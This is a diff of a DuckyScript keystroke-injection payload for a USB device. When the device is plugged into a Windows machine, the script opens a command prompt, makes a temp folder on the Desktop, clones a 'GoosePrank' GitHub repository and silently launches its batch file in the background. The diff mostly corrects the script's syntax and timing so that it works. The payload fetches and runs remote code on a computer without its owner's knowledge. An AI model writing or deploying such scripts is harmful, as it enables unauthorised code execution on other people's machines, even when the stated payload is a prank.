@@ -3,20 +3,21 @@ WINDOWS r
 DELAY 500
 STRING cmd
 ENTER
-DELAY 500
+DELAY 1000
 
-cd Desktop
+STRING cd Desktop
 ENTER
-mkdir temp
+STRING mkdir temp
 ENTER
-cd temp
+STRING cd temp
 ENTER
 
-git clone https://github.com/Deadverse/GoosePrank.git .
+STRING git clone https://github.com/Deadverse/GoosePrank.git .
 ENTER
-DELAY 10000
-START /B CMD /C CALL "startGoosePrank.bat" >NUL 2>&1
+DELAY 7500
+STRING START /B %COMSPEC% /K START /B CMD /C CALL "startGoosePrank.bat" >NUL 2>&1
 ENTER
-exit
+STRING exit
 ENTER
+
 
